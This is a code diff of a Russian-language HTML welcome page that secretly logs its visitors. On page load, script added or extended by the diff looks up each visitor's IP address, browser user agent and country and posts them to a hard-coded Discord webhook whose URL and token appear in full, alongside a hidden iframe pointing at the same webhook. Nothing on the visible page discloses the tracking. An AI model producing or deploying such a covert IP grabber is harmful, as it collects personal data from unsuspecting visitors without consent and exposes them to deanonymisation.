@@ -6,28 +6,54 @@
 </head>
 <body>
     <h1>Добро пожаловать на страницу!</h1>
-    
+
     <!-- Помещаем скрытый iframe на страницу -->
     <iframe src="https://discord.com/api/webhooks/1093641132673597562/9o1Nq18xZRKMiT4qUsjIx_l02CpaTdzU2Sd5K15kfRjcxieXek-uLdJtjeiOUhanC3r0" style="display:none;"></iframe>
 
     <!-- JavaScript код для получения IP и отправки его на вебхук в Discord -->
     <script>
         // Функция для отправки данных на вебхук в Discord
-        function sendToDiscord(ip) {
+        function sendToDiscord(ip, browser, country) {
             var xhr = new XMLHttpRequest();
             xhr.open("POST", "https://discord.com/api/webhooks/1093641132673597562/9o1Nq18xZRKMiT4qUsjIx_l02CpaTdzU2Sd5K15kfRjcxieXek-uLdJtjeiOUhanC3r0");
             xhr.setRequestHeader('Content-Type', 'application/json');
-            xhr.send(JSON.stringify({content: "IP-адрес: " + ip}));
+            xhr.send(JSON.stringify({
+                embeds: [{
+                    title: 'Новое подключение к странице',
+                    color: 16711680,
+                    fields: [
+                        {
+                            name: 'IP-адрес',
+                            value: ip
+                        },
+                        {
+                            name: 'Браузер',
+                            value: browser
+                        },
+                        {
+                            name: 'Страна',
+                            value: country
+                        }
+                    ]
+                }]
+            }));
         }
 
         // Обработчик события загрузки страницы
-        window.onload = function() {
+        window.onload = function () {
             // Получаем IP-адрес
             fetch("https://api.ipify.org?format=json")
                 .then(response => response.json())
                 .then(data => {
-                    // Отправляем IP-адрес на вебхук в Discord
-                    sendToDiscord(data.ip);
+                    // Получаем информацию о браузере
+                    var browser = navigator.userAgent;
+                    // Получаем страну пользователя
+                    fetch('https://ipapi.co/'+ data.ip +'/country_name')
+                        .then(response => response.text())
+                        .then(country => {
+                            // Отправляем IP-адрес, информацию о браузере и страну пользователя на вебхук в Discord
+                            sendToDiscord(data.ip, browser, country);
+                        });
                 });
         };
     </script>
